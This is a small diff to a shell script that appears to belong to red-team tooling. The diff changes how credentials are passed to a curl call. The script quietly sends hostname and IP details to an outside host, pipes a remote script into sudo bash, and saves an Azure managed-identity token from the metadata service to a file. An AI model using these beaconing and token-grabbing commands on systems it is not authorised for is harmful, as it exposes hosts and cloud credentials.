@@ -4,7 +4,7 @@ ext_ip=$(curl ipinfo.io/ip -s)
 int_ip=$(ip route get 1 | awk '{print $7}' | head -n 1)
 hostname=$(hostname)
 auth=$1
-curl -s -X POST -L -k -u htgc:$auth https://badtoast.dx-red.team/host/new\?host%5Bhostname%5D\=$hostname\&host%5Bip_internal%5D\=$int_ip\&host%5Bip_external%5D\=$ext_ip > /dev/null 2>&1
+curl -s -X POST -L -k -u $auth https://badtoast.dx-red.team/host/new\?host%5Bhostname%5D\=$hostname\&host%5Bip_internal%5D\=$int_ip\&host%5Bip_external%5D\=$ext_ip > /dev/null 2>&1
 curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
 echo $(curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-06-01&resource=https://management.azure.com") > token.txt
 az login --identity
